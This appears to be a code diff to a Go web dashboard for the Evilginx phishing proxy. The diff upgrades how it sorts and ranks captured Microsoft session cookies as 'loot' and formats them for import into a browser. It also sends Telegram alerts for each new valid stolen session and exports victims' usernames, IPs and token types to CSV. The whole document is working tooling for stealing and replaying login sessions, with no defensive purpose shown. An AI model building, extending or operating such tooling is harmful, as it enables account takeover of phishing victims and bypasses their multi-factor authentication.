@@ -24,7 +24,7 @@ import (
 //go:embed index.html
 var indexHTML []byte
 
-const version = "1.0.0"
+const version = "1.1.0"
 
 // ---- Evilginx data model (matches kgretzky/evilginx2 database.Session) ----
 
@@ -64,6 +64,7 @@ type ExpCookie struct {
 	HostOnly       bool   `json:"hostOnly"`
 	Secure         bool   `json:"secure"`
 	Session        bool   `json:"session"`
+	SameSite       string `json:"sameSite"`
 }
 
 func (s Session) exportCookies() []ExpCookie {
@@ -78,20 +79,41 @@ func (s Session) exportCookies() []ExpCookie {
 			if path == "" {
 				path = "/"
 			}
+			dom := domain
+			hostOnly := !strings.HasPrefix(domain, ".")
+			secure := strings.HasPrefix(name, "__Host-") || strings.HasPrefix(name, "__Secure-")
+			if strings.HasPrefix(name, "__Host-") {
+				hostOnly = true
+				secure = true
+				dom = strings.TrimPrefix(domain, ".")
+				path = "/"
+			}
+			if !secure {
+				switch strings.ToLower(name) {
+				case "estsauth", "estsauthpersistent", "rpssecauth", "mspauth", "signinstatescookie":
+					secure = true
+				}
+			}
 			out = append(out, ExpCookie{
 				Path:           path,
-				Domain:         domain,
+				Domain:         dom,
 				ExpirationDate: exp,
 				Value:          ct.Value,
 				Name:           name,
 				HttpOnly:       ct.HttpOnly,
-				HostOnly:       !strings.HasPrefix(domain, "."),
-				Secure:         strings.HasPrefix(name, "__Host-") || strings.HasPrefix(name, "__Secure-"),
+				HostOnly:       hostOnly,
+				Secure:         secure,
 				Session:        false,
+				SameSite:       "no_restriction",
 			})
 		}
 	}
-	sort.Slice(out, func(i, j int) bool { return out[i].Name < out[j].Name })
+	sort.Slice(out, func(i, j int) bool {
+		if out[i].Domain == out[j].Domain {
+			return out[i].Name < out[j].Name
+		}
+		return out[i].Domain < out[j].Domain
+	})
 	return out
 }
 
@@ -103,45 +125,99 @@ func (s Session) cookieCount() int {
 	return n
 }
 
-// hasValidSession: a real reusable auth token was captured (org + personal MS,
-// generic fallback for other phishlets).
-func (s Session) hasValidSession() bool {
-	junk := map[string]bool{"": true, "Disabled": true, "estsfd": true}
-	strong := map[string]bool{
-		"ESTSAUTH": true, "ESTSAUTHPERSISTENT": true, "RPSSecAuth": true,
-		"MSPAuth": true, "__Host-MSAAUTH": true, "SignInStateCookie": true,
+// Microsoft leaves these stubs when a cookie is deleted or never issued.
+// "__Host-MSAAUTH=11" is the passwordless MSA path: the real session is __Host-MSAAUTHP.
+func isJunkCookieValue(v string) bool {
+	switch v {
+	case "", "Disabled", "estsfd", "11":
+		return true
+	}
+	return len(v) <= 2
+}
+
+type lootInfo struct {
+	Valid      bool
+	Kind       string // entra | msa | ""
+	Token      string // strongest cookie name
+	Persistent bool
+	Tokens     []string
+}
+
+// inspectLoot classifies a capture. "Valid" means a replayable IdP token is present,
+// not merely a password or a routing cookie.
+func (s Session) inspectLoot() lootInfo {
+	var info lootInfo
+	best := 0
+	seen := map[string]bool{}
+	rankOf := func(name string) (rank int, kind string, persist bool) {
+		switch strings.ToLower(name) {
+		case "estsauthpersistent":
+			return 40, "entra", true
+		case "__host-msaauthp":
+			return 39, "msa", true
+		case "estsauth":
+			return 30, "entra", false
+		case "__host-msaauth":
+			return 29, "msa", false
+		case "rpssecauth", "mspauth":
+			return 28, "msa", false
+		case "signinstatescookie":
+			return 10, "entra", false
+		default:
+			return 0, "", false
+		}
 	}
 	for _, names := range s.CookieTokens {
 		for name, ct := range names {
-			if ct == nil || junk[ct.Value] {
+			if ct == nil || isJunkCookieValue(ct.Value) {
 				continue
 			}
-			if strong[name] {
-				return true
+			rank, kind, persist := rankOf(name)
+			if rank == 0 {
+				continue
+			}
+			if !seen[name] {
+				seen[name] = true
+				info.Tokens = append(info.Tokens, name)
+			}
+			if persist {
+				info.Persistent = true
+			}
+			if rank > best {
+				best = rank
+				info.Token = name
+				info.Kind = kind
 			}
 		}
 	}
-	if s.Password != "" && s.cookieCount() > 0 {
-		return true
+	sort.Strings(info.Tokens)
+	if best > 0 {
+		info.Valid = true
 	}
-	return false
+	return info
 }
+
+func (s Session) hasValidSession() bool { return s.inspectLoot().Valid }
 
 // ---- API shapes ----
 
 type apiSession struct {
-	Id         int    `json:"id"`
-	Phishlet   string `json:"phishlet"`
-	Username   string `json:"username"`
-	Password   string `json:"password"`
-	Valid      bool   `json:"valid"`
-	Cookies    int    `json:"cookies"`
-	RemoteAddr string `json:"remote_addr"`
-	Create     int64  `json:"create_time"`
-	Update     int64  `json:"update_time"`
-	UserAgent  string `json:"useragent"`
-	Landing    string `json:"landing_url"`
-	SessionId  string `json:"session_id"`
+	Id         int      `json:"id"`
+	Phishlet   string   `json:"phishlet"`
+	Username   string   `json:"username"`
+	Password   string   `json:"password"`
+	Valid      bool     `json:"valid"`
+	Kind       string   `json:"kind"`
+	Token      string   `json:"token"`
+	Persistent bool     `json:"persistent"`
+	Tokens     []string `json:"tokens"`
+	Cookies    int      `json:"cookies"`
+	RemoteAddr string   `json:"remote_addr"`
+	Create     int64    `json:"create"`
+	Update     int64    `json:"update"`
+	UserAgent  string   `json:"useragent"`
+	Landing    string   `json:"landing"`
+	SessionId  string   `json:"session_id"`
 }
 
 type apiData struct {
@@ -377,10 +453,11 @@ func exportCSVHandler(dbPath string) http.HandlerFunc {
 		}
 		w.Header().Set("Content-Type", "text/csv; charset=utf-8")
 		w.Header().Set("Content-Disposition", "attachment; filename=evilginx-sesiones.csv")
-		fmt.Fprintln(w, "id,phishlet,usuario,sesion_valida,cookies,ip,creado,actualizado")
+		fmt.Fprintln(w, "id,phishlet,usuario,sesion_valida,tipo,token,persistente,cookies,ip,creado,actualizado")
 		for _, s := range sessions {
-			fmt.Fprintf(w, "%d,%s,%q,%t,%d,%s,%s,%s\n",
-				s.Id, s.Phishlet, s.Username, s.hasValidSession(), s.cookieCount(), s.RemoteAddr,
+			loot := s.inspectLoot()
+			fmt.Fprintf(w, "%d,%s,%q,%t,%s,%s,%t,%d,%s,%s,%s\n",
+				s.Id, s.Phishlet, s.Username, loot.Valid, loot.Kind, loot.Token, loot.Persistent, s.cookieCount(), s.RemoteAddr,
 				time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04:05"), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04:05"))
 		}
 	}
@@ -491,16 +568,7 @@ func sendTelegram(token, chat, text string) error {
 	return nil
 }
 
-func hasPersistent(s Session) bool {
-	for _, names := range s.CookieTokens {
-		for name, ct := range names {
-			if ct != nil && ct.Value != "" && (name == "ESTSAUTHPERSISTENT" || name == "__Host-MSAAUTHP") {
-				return true
-			}
-		}
-	}
-	return false
-}
+func hasPersistent(s Session) bool { return s.inspectLoot().Persistent }
 
 // startWatcher polls the db and fires a Telegram alert on each NEW valid
 // session. Existing valid sessions are seeded on start so it never spams the
@@ -539,12 +607,17 @@ func startWatcher(dbPath string, interval time.Duration) {
 					if user == "" {
 						user = "(sin usuario)"
 					}
+					loot := x.inspectLoot()
 					persist := ""
-					if hasPersistent(x) {
-						persist = " · persistente ✅"
+					if loot.Persistent {
+						persist = " · persistente"
 					}
-					msg = fmt.Sprintf("🎣 *Nueva sesión válida*\n\n👤 `%s`\n🧩 %s\n🌐 %s\n🍪 %d cookies%s\n🆔 #%d · %s",
-						user, x.Phishlet, x.RemoteAddr, x.cookieCount(), persist, x.Id, time.Unix(x.UpdateTime, 0).Format("2006-01-02 15:04:05"))
+					kind := loot.Kind
+					if kind == "" {
+						kind = "token"
+					}
+					msg = fmt.Sprintf("Nueva sesión %s%s\n\n`%s`\n%s · %s\n%s · %d cookies\n#%d · %s",
+						kind, persist, user, x.Phishlet, loot.Token, x.RemoteAddr, x.cookieCount(), x.Id, time.Unix(x.UpdateTime, 0).Format("2006-01-02 15:04:05"))
 				}
 				if err := sendTelegram(cfg.TGToken, cfg.TGChat, msg); err != nil {
 					log.Println("telegram:", err)
@@ -877,9 +950,11 @@ func dataHandler(dbPath string) http.HandlerFunc {
 		}
 		d := apiData{Now: time.Now().Format("2006-01-02 15:04:05"), DB: dbPath, SBEnabled: sbEnabled}
 		for _, s := range sessions {
+			loot := s.inspectLoot()
 			d.Sessions = append(d.Sessions, apiSession{
 				Id: s.Id, Phishlet: s.Phishlet, Username: s.Username, Password: s.Password,
-				Valid: s.hasValidSession(), Cookies: s.cookieCount(), RemoteAddr: s.RemoteAddr,
+				Valid: loot.Valid, Kind: loot.Kind, Token: loot.Token, Persistent: loot.Persistent, Tokens: loot.Tokens,
+				Cookies: s.cookieCount(), RemoteAddr: s.RemoteAddr,
 				Create: s.CreateTime, Update: s.UpdateTime, UserAgent: s.UserAgent,
 				Landing: s.LandingURL, SessionId: s.SessionId,
 			})
